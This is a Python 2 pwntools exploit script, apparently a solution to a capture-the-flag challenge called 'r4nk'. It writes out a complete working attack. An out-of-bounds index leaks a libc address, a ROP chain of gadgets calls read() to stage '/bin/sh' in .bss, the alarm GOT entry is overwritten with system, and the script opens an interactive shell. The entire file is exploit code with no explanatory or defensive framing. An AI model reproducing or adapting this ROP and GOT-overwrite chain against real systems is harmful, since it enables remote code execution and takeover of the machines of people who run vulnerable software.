from pwn import *
context.log_level = 'debug'

TARGET = './r4nk'
HOST = 'challenges.fbctf.com'
PORT = 1339

# r = process(TARGET)
r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
# r = remote(HOST, PORT)
# b*0x4008f6 b*0x40096e b*0x40079e
gdb.attach(r, '''
b*0x400acd
''')
elf = ELF(TARGET)
# elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


def input_rop(index, value):
    r.sendlineafter('>', '2')
    r.sendlineafter('t1tl3>', str(index-1))
    r.sendlineafter('r4nk>', str(value))

r.recvuntil('')
r.sendlineafter('>', '2')
r.sendlineafter('t1tl3>', '0')
r.sendlineafter('r4nk>', '-263023')
r.sendlineafter('>', '2')
r.sendlineafter('t1tl3>', '1')
r.sendlineafter('r4nk>', '0')
r.sendlineafter('>', '1')
r.recvuntil('0. ')
leak = u64(r.recv(6).ljust(8, '\x00'))
# base = leak - 0xe1510
base = leak - 0xe4840

dbg("leak")
dbg("base")
system = base + 0x4f440 

rbx = 0x40080f
rbp = 0x4006f8
pop12_15 = 0x400b3c # r12: write.plt, r13: 1, r14: stack, r15: 8
call_r12_pop6 = 0x400b20

bss = 0x602120

input_rop(18, rbp+1)
# read(0, bss, size)
input_rop(19, pop12_15)
input_rop(20, elf.got['read']) 
input_rop(21, 0)
input_rop(22, bss) 
input_rop(23, 0x8) 
input_rop(24, rbp) 
input_rop(25, 1) 
input_rop(26, rbx) 
input_rop(27, 0) 
input_rop(28, call_r12_pop6) 
# <- pop 6+2 here 

# read(0, got['alarm'], size)
input_rop(36, pop12_15)
input_rop(37, elf.got['read']) 
input_rop(38, 0)
input_rop(39, elf.got['alarm']) 
input_rop(40, 0x100) 
input_rop(41, rbp) 
input_rop(42, 1) 
input_rop(43, rbx) 
input_rop(44, 0) 
input_rop(45, call_r12_pop6) 
# <- pop 6+2 here 

# system("/bin/sh", NULL, NULL)
input_rop(53, pop12_15)
input_rop(54, elf.got['alarm']) 
input_rop(55, bss)
input_rop(56, 0) 
input_rop(57, 0) 
input_rop(58, rbp) 
input_rop(59, 1) 
input_rop(60, rbx) 
input_rop(61, 0) 
input_rop(62, call_r12_pop6) 
# <- pop 6+2 here 

r.sendlineafter('>', '3')
r.recvuntil('g00dBy3')
r.sendline('/bin/sh')
r.sendline(p64(system))

r.interactive()
r.close()
